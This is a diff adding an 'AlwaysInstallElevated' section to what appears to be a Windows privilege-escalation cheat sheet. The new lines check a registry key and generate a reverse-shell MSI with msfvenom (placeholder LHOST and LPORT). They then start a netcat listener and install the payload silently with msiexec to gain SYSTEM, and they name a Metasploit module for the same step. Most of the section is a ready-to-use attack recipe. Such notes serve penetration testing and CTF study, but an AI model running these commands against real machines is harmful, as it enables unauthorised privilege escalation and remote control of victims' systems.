@@ -280,6 +280,20 @@ dir /a:h `show only hidden files`<br/>
 * Running `winPEAS.exe` on the machine 
 * Running `PowerUp.ps1` (https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) , documentation https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ `. .\PowerUp.ps1` Then `Invoke-AllChecks`
 
+## AlwaysInstallElevated 
+
+If you see that `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` returns 1 it means that we can install any windows program as SYSTEM
+So to exploit this generate a windows payload <br/>
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi`<br/>
+Start a netcat listener <br/>
+
+Transfer and run this on target machine <br/>
+`msiexec /quiet /qn /i shell.msi`<br/>
+
+Alternatively this can be done with metaslpoit's post exploitation module
+
+`exploit/windows/local/always_install/elevated`
 
 ## List Drives
 `wmic logicaldisk get caption`
